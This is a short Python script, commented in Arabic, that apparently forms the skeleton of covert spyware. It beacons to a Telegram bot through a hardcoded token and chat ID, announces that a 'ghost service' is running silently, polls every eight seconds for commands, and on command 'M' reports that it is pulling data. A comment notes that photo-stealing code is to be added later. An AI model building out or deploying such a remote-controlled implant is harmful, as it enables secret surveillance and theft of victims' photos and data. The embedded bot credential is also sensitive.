import os
import time
import requests

TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"

def get_command():
    try:
        # قراءة آخر رسالة من البوت
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1&limit=1"
        res = requests.get(url, timeout=5).json()
        if res.get("result"):
            return res["result"][0].get("message", {}).get("text", "").upper()
    except: return None

if __name__ == '__main__':
    # إبلاغك بأن الخدمة تعمل الآن في الخلفية
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": "💀 خدمة الشبح تعمل الآن بصمت..."})
    
    while True:
        cmd = get_command()
        if cmd == "M":
            # رد البوت عند استلام الأمر
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                          data={"chat_id": CHAT_ID, "text": "📸 استلمت الأمر M.. جاري سحب البيانات المكتشفة!"})
            # هنا يمكنك إضافة كود سحب الصور لاحقاً
            
        time.sleep(8) # يفحص كل 8 ثواني لتقليل استهلاك البطارية
